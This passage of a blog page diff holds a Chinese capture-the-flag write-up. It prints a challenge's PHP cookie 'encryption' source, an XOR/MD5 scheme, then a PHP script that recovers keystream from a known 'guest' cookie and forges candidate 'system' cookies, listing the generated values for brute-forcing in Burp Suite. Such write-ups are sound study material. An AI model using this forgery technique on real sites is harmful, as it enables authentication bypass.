class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="comment">//获取length位数的随机字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密过程，txt是明文，key是密文</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);	<span class="comment">//txt内容ASCII码值加10</span></span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>);	</span><br><span class="line">    $key=md5($rnd.$key);	<span class="comment">//随机字符与密钥key拼接得到新的密钥</span></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];	<span class="comment">//将明文与密钥key按位进行异或</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);	<span class="comment">//base64加密</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密过程，txt是密文，key是密钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);	<span class="comment">//减掉4位随机数</span></span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);		<span class="comment">//真正的密文</span></span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];	<span class="comment">//将密文与秘钥进行异或得到tmp</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;	<span class="comment">//明文</span></span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);		<span class="comment">//获取cookie的内容</span></span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看了PureT大佬的wp <a href="https://www.jianshu.com/p/3d7fb34c28a6" target="_blank" rel="noopener">https://www.jianshu.com/p/3d7fb34c28a6</a><br>分析之后，flag应该是在config里。fl3g_ichuqiu.php文件接收cookie值解密之后如果等于system就输出flag，我们要做的就是研究加密算法怎么让fl3g_ichuqiu.php解密cookie中的username等于system。<br>破解这个加密算法的着手点就是我们已知guest加密后的结果。<br>先用burpsuite拦截数据包读取cookie然后运行脚本。<br>大佬大佬，PHP写了个脚本，佩服~~</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">    $text = <span class="string">'guest'</span>;</span><br><span class="line">    $cookie_guest = <span class="string">'dk9FS0hOXUhH'</span>; </span><br><span class="line">    $cookie_guest = base64_decode($cookie_guest);</span><br><span class="line">    $rnd = substr($cookie_guest,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">    $cookie_guest = substr($cookie_guest,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($text); $i++) &#123;</span><br><span class="line">        $text[$i] = chr(ord($text[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($text); $i++) &#123;</span><br><span class="line">        $key .= ($text[$i] ^ $cookie_guest[$i]);</span><br><span class="line">    &#125;</span><br><span class="line">    $text2 = <span class="string">'system'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($text2); $i++) &#123;</span><br><span class="line">        $text2[$i] = chr(ord($text2[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $t = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($t); $j++) &#123;</span><br><span class="line">        $key_temp = $key.$t[$j];</span><br><span class="line">        $result = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($text2); $i++) &#123;</span><br><span class="line">            $result .= ($key_temp[$i] ^ $text2[$i]);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = base64_encode($rnd.$result);</span><br><span class="line">        <span class="keyword">echo</span> $result.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在脚本中已经写好了所有六位的情况，运行脚本输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dk9FS0SyT0tWRw==</span><br><span class="line">dk9FS0SyT0tWRg==</span><br><span class="line">dk9FS0SyT0tWRQ==</span><br><span class="line">dk9FS0SyT0tWRA==</span><br><span class="line">dk9FS0SyT0tWQw==</span><br><span class="line">dk9FS0SyT0tWQg==</span><br><span class="line">dk9FS0SyT0tWQQ==</span><br><span class="line">dk9FS0SyT0tWQA==</span><br><span class="line">dk9FS0SyT0tWTw==</span><br><span class="line">dk9FS0SyT0tWTg==</span><br><span class="line">dk9FS0SyT0tWFg==</span><br><span class="line">dk9FS0SyT0tWFQ==</span><br><span class="line">dk9FS0SyT0tWFA==</span><br><span class="line">dk9FS0SyT0tWEw==</span><br><span class="line">dk9FS0SyT0tWEg==</span><br><span class="line">dk9FS0SyT0tWEQ==</span><br></pre></td></tr></table></figure>
+<p>guest5位而system6位，还有最后1位需要我们爆破，把上面的载入到bp爆破，理论上是这样，但是就是爆不出来，┭┮﹏┭┮<br><img src="https://img-blog.csdnimg.cn/20191013172648841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019101317270864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019101317274065.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
       
     </div>
 
@@ -1100,7 +1114,7 @@
       </div>
 	  
 	  <div id="music163player">
-		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=86 src="https://music.163.com/#/song?id=1349292048">
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=28312036&auto=1&height=66">
 		</iframe>
 	  </div>
 
